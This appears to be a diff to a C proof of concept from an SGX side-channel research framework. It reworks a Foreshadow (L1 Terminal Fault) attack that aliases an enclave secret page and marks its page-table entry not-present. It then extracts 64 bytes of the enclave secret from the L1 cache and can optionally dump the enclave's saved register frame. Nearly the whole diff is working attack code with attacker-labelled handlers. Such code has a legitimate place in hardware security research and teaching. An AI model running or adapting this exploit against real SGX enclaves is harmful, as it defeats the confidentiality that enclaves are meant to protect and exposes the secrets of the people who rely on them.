@@ -32,6 +32,10 @@
 #include "libsgxstep/foreshadow.h"
 #include "libsgxstep/cache.h"
 
+#define DUMP_SSA            1
+#define ITER_RELOAD         1
+#define SECRET_BYTES        64      /* read entire cache line */
+
 #define DEBUG_ENCLAVE	    1
 #define RELEASE_ENCLAVE	    0
 
@@ -39,16 +43,21 @@
 #define ENCLAVE_MODE 	DEBUG_ENCLAVE
 
 uint8_t *oracle = NULL;
-void *trigger_ptr = NULL;
+void *secret_ptr = NULL;
+void *secret_page = NULL;
+void *alias_ptr = NULL;
+uint64_t *pte_alias_secret = NULL;
 
 void *ssa_gprsgx = NULL;
 void *alias_ssa_gprsgx = NULL;
-uint64_t *pte_alias = NULL;
+uint64_t *pte_alias_gprsgx = NULL;
 
 gprsgx_region_t shadow_gprsgx = {0x00};
 
 int fault_fired = 0;
 int cur_byte = 0;
+
+sgx_enclave_id_t eid = 0;
 
 /* ================== ATTACKER IRQ/FAULT HANDLERS ================= */
 
@@ -57,19 +66,21 @@ void fault_handler(int signal)
 {
     fault_fired++;
 
-    if ( !(cur_byte = foreshadow_ssa(&shadow_gprsgx, alias_ssa_gprsgx, oracle)) )
-    {
-        /* restore access on trigger page to allow enclave to finish execution */
-        printf("\n");
-        info("finishing enclave execution (restoring trigger access rights)");
-        ASSERT(!mprotect(trigger_ptr, 0x1000, PROT_READ | PROT_WRITE));
-    }
-    else
-    {
-        if (fault_fired == 1)
-            printf("[#PF handler] ERESUME prefetch to refresh GPRSGX region; byte: ");
-        printf("%d ", cur_byte);
-    }
+    #if DUMP_SSA
+        if ( !(cur_byte = foreshadow_ssa(&shadow_gprsgx, alias_ssa_gprsgx, oracle)) )
+        {
+            /* restore access on trigger page to allow enclave to finish execution */
+            printf("\n");
+            info("finishing enclave execution (restoring trigger access rights)");
+            ASSERT(!mprotect(secret_page, 0x1000, PROT_READ | PROT_WRITE));
+        }
+        else
+        {
+            if (fault_fired == 1)
+                printf("[#PF handler] ERESUME prefetch to refresh GPRSGX region; byte: ");
+            printf("%d ", cur_byte);
+        }
+    #endif
 }
 
 /* ================== ATTACKER INIT/SETUP ================= */
@@ -90,20 +101,32 @@ void attacker_config_runtime(void)
 
 void attacker_config_page_table(void)
 {
-    info("enclave trigger at %p (revoking trigger access rights)", oracle);
-    ASSERT( !mprotect( trigger_ptr, 0x1000, PROT_NONE ));
+    /* benchmark enclave trigger page and SSA frame addresses */
+    SGX_ASSERT( enclave_generate_secret( eid, &secret_ptr) );
+	secret_page = (void *)( (uint64_t) secret_ptr & ~UINT64_C(0xfff) );
 
     /* establish independent virtual alias mapping for enclave secret */
-    ssa_gprsgx = get_enclave_ssa_gprsgx_adrs();
-    alias_ssa_gprsgx = remap_page_table_level( ssa_gprsgx, PAGE );
-    info("enclave SSA GPRSGX region at %p; alias at %p (revoking alias access rights)",
-        ssa_gprsgx, alias_ssa_gprsgx);
-    print_pte_adrs(ssa_gprsgx);
+    alias_ptr = remap_page_table_level( secret_ptr, PAGE);
+    info("Randomly generated enclave secret at %p (page %p); alias at %p (revoking alias access rights)",
+        secret_ptr, secret_page, alias_ptr);
+    print_pte_adrs(secret_ptr);
 
     /* ensure a #PF on trigger accesses through the *alias* mapping */
-    ASSERT( pte_alias = remap_page_table_level( alias_ssa_gprsgx, PTE) );
-    *pte_alias = MARK_NOT_PRESENT(*pte_alias);
-    print_pte(pte_alias);
+    ASSERT( pte_alias_secret = remap_page_table_level( alias_ptr, PTE) );
+    *pte_alias_secret = MARK_NOT_PRESENT(*pte_alias_secret);
+    print_pte(pte_alias_secret);
+
+    #if DUMP_SSA
+        ssa_gprsgx = get_enclave_ssa_gprsgx_adrs();
+        alias_ssa_gprsgx = remap_page_table_level( ssa_gprsgx, PAGE );
+        info("enclave SSA GPRSGX region at %p; alias at %p (revoking alias access rights)",
+            ssa_gprsgx, alias_ssa_gprsgx);
+        print_pte_adrs(ssa_gprsgx);
+
+        ASSERT( pte_alias_gprsgx = remap_page_table_level( alias_ssa_gprsgx, PTE) );
+        *pte_alias_gprsgx = MARK_NOT_PRESENT(*pte_alias_gprsgx);
+        print_pte(pte_alias_gprsgx);
+    #endif
 }
 
 void attacker_restore_runtime(void)
@@ -117,9 +140,10 @@ void attacker_restore_runtime(void)
 /* Untrusted main function to create/enter the trusted enclave. */
 int main( int argc, char **argv )
 {
-    sgx_enclave_id_t eid = 0;
     sgx_launch_token_t token = {0};
-    int updated = 0;
+    int i, updated = 0;
+    uint8_t real[SECRET_BYTES] = {0x0};
+    uint8_t recovered[SECRET_BYTES] = {0x0};
     
     info("Creating enclave...");
     SGX_ASSERT( sgx_create_enclave( ENCLAVE_SO, ENCLAVE_MODE,
@@ -127,19 +151,38 @@ int main( int argc, char **argv )
 
     /* configure attack untrusted runtime */
     attacker_config_runtime();
-
-    /* benchmark enclave trigger page and SSA frame addresses */
-    SGX_ASSERT( enclave_get_trigger_adrs( eid, &trigger_ptr) );
     attacker_config_page_table();
 
-    /* enter enclave; should fault on trigger page */
-    sgx_step_eresume_cnt = 0;
-    SGX_ASSERT( enclave_run( eid ) );
+    /* enter enclave and extract secrets */
+    info_event("Foreshadow secret extraction");
+    info("prefetching enclave secret (EENTER/EEXIT)...");
+	SGX_ASSERT( enclave_reload( eid, secret_ptr ) );
 
-    ASSERT(fault_fired);
-    dump_gprsgx_region(&shadow_gprsgx);
-    foreshadow_dump_perf();
-    info("total of %d faulting ERESUME calls needed", sgx_step_eresume_cnt); 
+    info("extracting secret from L1 cache..");
+    for (i=0; i < SECRET_BYTES; i++)
+    {
+        #if ITER_RELOAD
+            SGX_ASSERT( enclave_reload( eid, secret_ptr ) );
+        #endif
+        recovered[i] = foreshadow(alias_ptr+i, oracle);
+    }
+
+    info("verifying and destroying enclave secret..");
+	SGX_ASSERT( enclave_destroy_secret( eid, real) );
+    foreshadow_compare_secret(recovered, real, SECRET_BYTES);
+
+    #if DUMP_SSA
+        info_event("Foreshadow SSA frame extraction");
+        info("revoking trigger secret access rights..");
+        ASSERT( !mprotect( secret_page, 0x1000, PROT_NONE ));
+        sgx_step_eresume_cnt = 0;
+        SGX_ASSERT( enclave_run( eid ) );
+
+        ASSERT(fault_fired);
+        dump_gprsgx_region(&shadow_gprsgx);
+        foreshadow_dump_perf();
+        info("total of %d faulting ERESUME calls needed", sgx_step_eresume_cnt); 
+    #endif
 
     attacker_restore_runtime();
     return 0;
